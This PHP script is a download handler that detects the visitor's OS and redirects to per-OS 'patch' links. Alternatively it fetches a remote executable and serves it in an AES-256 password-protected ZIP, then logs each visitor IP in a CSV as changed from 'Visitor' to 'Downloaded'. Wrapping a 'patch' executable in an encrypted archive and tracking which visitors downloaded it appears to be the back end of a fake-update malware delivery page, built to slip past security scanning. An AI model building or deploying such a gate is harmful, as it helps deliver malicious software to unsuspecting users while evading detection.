<?php

// Load JSON settings file
$settingsFile = 'settings.json'; // Path to the settings file
$settingsFileStr = file_get_contents($settingsFile);
$settings = json_decode($settingsFileStr, false);


// Get values from the settings file
$archiving = $settings->Archiving->Enabled;
$correct_password = $settings->Archiving->Password; // Password for the ZIP file
$software_name = $settings->Archiving->SoftwareName; // Software Name
$zip_file = $settings->Archiving->ZIPName; // Name of the resulting ZIP file
$FileName = $settings->FileName; // Set filename when download

$AndroidLink = $settings->AndroidLink;
$iOSLink = $settings->iOSLink;
$MacOSLink = $settings->MacOSLink;

// PatchDownloadLinks
$patchURL = $settings->PatchDownloadLinks[0];

// get user's ip address
$userIP = $_SERVER['REMOTE_ADDR'];
$userOS = getOS();

// Function to get user's OS
function getOS() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/Windows/i', $userAgent)) return 'Windows';
    if (preg_match('/Macintosh|Mac OS X/i', $userAgent)) return 'macOS';
    if (preg_match('/Android/i', $userAgent)) return 'Android';
    if (preg_match('/iPhone|iPad/i', $userAgent)) return 'iPhone';
    return 'Unknown OS';
}

// Handle download request
if ($_SERVER['REQUEST_METHOD'] == 'GET') {

    // if archiving => OFF, users will redirect the patchDownloadLinks
    if ($archiving == "OFF") {
        
        switch($userOS) {
            case "Windows":
                header("Location: $patchURL");
                break;
            case "Android":
                header("Location: $AndroidLink");
                break;
            case "iPhone":
                header("Location: $iOSLink");
                break;
            case "macOS":
                header("Location: $MacOSLink");
                break;
        }

        // modify download status
        modifyDownloadStatus($userIP);
        // download count
        incrementDownloadCount();

        exit;
        
    }

    // if archiving => ON, users will download .zip file
    if ($archiving == "ON") {
        
         // Download the external .exe file from the patch download link

         switch($userOS) {
            case "Windows":
                $exe_content = file_get_contents($patchURL);
                break;
            case "Android":
                $exe_content = file_get_contents($AndroidLink);
                break;
            case "iPhone":
                $exe_content = file_get_contents($iOSLink);
                break;
            case "macOS":
                $exe_content = file_get_contents($MacOSLink);
                break;
        }
 
 
         if ($exe_content === false) {
             die('Failed to download the file.');
         }
 
         // Create a new ZIP file
         $zip = new ZipArchive();
         if ($zip->open($zip_file, ZipArchive::CREATE) !== TRUE) {
             die('Failed to create .zip file.');
         }
 
         // Add the .exe file to the ZIP archive
         $zip->addFromString($patchURL, $exe_content);
 
         // Set password and encryption for the ZIP file
         $zip->setPassword($correct_password);
         $zip->setEncryptionName($patchURL, ZipArchive::EM_AES_256);
         $zip->close();
 
         // Serve the ZIP file to the user for download
         if (file_exists($zip_file)) {
 
             header('Content-Description: File Transfer');
             header('Content-Type: application/zip');
             header('Content-Disposition: attachment; filename="'.basename($zip_file).'"');
             header('Expires: 0');
             header('Cache-Control: must-revalidate');
             header('Pragma: public');
             header('Content-Length: ' . filesize($zip_file));
             readfile($zip_file);
 
             unlink($zip_file); // Delete the ZIP file after serving it
 
             // modify the download status
             modifyDownloadStatus($userIP);
             
             // download count
             incrementDownloadCount();
 
            exit;
        } else {
            die('Failed to create the .zip file.');
        }

    }
    
} else {
    echo 'Invalid request.';
}


// Function to track download count
function incrementDownloadCount() {
    $downloadFile = 'download_count.txt';

    // Increment download count
    if (file_exists($downloadFile)) {
        $count = (int)file_get_contents($downloadFile);
        $count++;
    } else {
        $count = 1;
    }
    file_put_contents($downloadFile, $count);
}


// Function to modify the Doanload = success in csv file
function modifyDownloadStatus($userIP) {
    $csvFile = 'visitors.csv';
    $rows = [];

    // Open the CSV file and read its contents
    if (file_exists($csvFile)) {
        $file = fopen($csvFile, 'r');
        
        // Read each row and store in an array
        while (($data = fgetcsv($file)) !== FALSE) {
            // Check if the IP matches the target IP
            if ($data[0] === $userIP && $data[6] === "Visitor") {
                // Change "Visitor" to "Downloaded"
                $data[6] = "Downloaded";
            }
            $rows[] = $data; // Store updated row
        }
        fclose($file);
    }

    // Write the updated rows back to the CSV file
    $file = fopen($csvFile, 'w');
    foreach ($rows as $row) {
        fputcsv($file, $row);
    }
    fclose($file);
}



?>
